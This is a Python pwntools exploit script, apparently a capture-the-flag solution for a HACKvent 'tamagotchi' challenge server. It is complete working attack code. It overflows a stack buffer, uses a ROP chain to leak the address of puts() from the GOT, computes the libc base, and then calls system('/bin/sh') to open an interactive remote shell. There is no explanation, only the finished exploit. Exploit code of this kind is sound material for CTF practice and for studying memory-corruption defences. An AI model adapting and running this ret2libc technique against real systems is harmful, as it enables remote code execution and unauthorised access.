#!/usr/bin/env python
#-*- coding: utf-8 -*-

from pwn import *
from struct import *

r = remote("challenges.hackvent.hacking-lab.com", 31337)

rip_offset = 216                                # offset to RIP
rop = 0x400803                                  # pop rdi; ret;
puts_plt = 0x4004b0                             # puts@plt
main = 0x4006ca                                 # address of main() so we can jump back to the choice after getting the libc address

puts_got = 0x601018                             # puts() GOT                    - objdump -R tamagotchi | grep puts
puts_off = 0x078460                             # offset to puts() function     - readelf -s libc-2.26.so | grep puts
system_off = 0x47dc0                            # system offset in libc         - readelf -s libc-2.26.so | grep system
bin_sh_off  = 0x1a3ee0                          # shell offset in /bin/sh       - objdump -s libc-2.26.so | grep /bin/sh

# buffer to leak remote puts() address
buf_leak = "A"*rip_offset
buf_leak += pack("<Q", rop)
buf_leak += pack("<Q", puts_got)
buf_leak += pack("<Q", puts_plt)
buf_leak += pack("<Q", main)

# stage 1: read the remote puts() address
print r.recvuntil("[ch01c3]>")
r.sendline("1")
print r.recvuntil("[f00d]>")
r.sendline(buf_leak)
print r.recvuntil("[ch01c3]>")
r.sendline("2")
print r.recvuntil("[+] bye bye\n")

# calculate remote addresses from known offsets
puts_got_val = u64(r.recv(6) + "\x00"*2)
libc_base = puts_got_val - puts_off
system = libc_base + system_off
bin_sh = libc_base + bin_sh_off

print "[+] libc base at: 0x%08x" % libc_base
print "[+] system() at: 0x%08x" % system
print "[+] /bin/sh at: 0x%08x" % bin_sh

# buffer to get remote command execution
buf_rce = "A"*rip_offset
buf_rce += pack("<Q", rop)
buf_rce += pack("<Q", bin_sh)
buf_rce += pack("<Q", system)

# stage 2: pwn
print r.recvuntil("[ch01c3]>")
r.sendline("1")
print r.recvuntil("[f00d]>")
r.sendline(buf_rce)
print r.recvuntil("[ch01c3]>")
r.sendline("2")
print r.recvuntil("[+] bye bye\n")

r.interactive()
